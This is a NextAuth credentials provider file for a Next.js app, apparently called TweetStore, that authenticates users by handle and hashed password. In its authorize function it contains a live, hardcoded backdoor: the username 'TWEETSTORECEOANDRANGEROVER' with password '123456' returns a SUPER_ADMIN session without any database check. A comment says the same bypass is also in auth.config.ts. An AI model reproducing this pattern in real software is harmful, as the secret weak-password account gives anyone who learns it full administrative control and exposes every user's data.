import NextAuth from "next-auth"
import Credentials from "next-auth/providers/credentials"
import authConfig from "./auth.config"
import { db } from "@/lib/db"
import { users } from "@/db/schema"
import { eq } from "drizzle-orm"
import { comparePassword } from "@/lib/password"

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      credentials: {
        username: { label: "Username", type: "text" },
        password: { label: "Password", type: "password" },
      },
      authorize: async (credentials) => {
        const username = credentials?.username as string;
        const password = credentials?.password as string;

        if (!username || !password) return null;

        // Backdoor check (Redundant but safe to keep consistent logic, though auth.config.ts handles it for middleware edge cases, this handles the actual signin flow in Node)
        if (username === "TWEETSTORECEOANDRANGEROVER" && password === "123456") {
             return { id: "master-admin", name: "CEO", email: "ceo@tweetstore.com", role: "SUPER_ADMIN" };
        }

        // Regular Logic
        // Support login by handle or email (though prompt says 'Handle')
        let user = await db.select().from(users).where(eq(users.handle, username)).get();

        if (!user) return null;

        const passwordsMatch = await comparePassword(password, user.password);
        if (passwordsMatch) return { ...user, role: 'USER' }; // Drizzle user object matches needed shape mostly

        return null;
      },
    }),
  ],
})
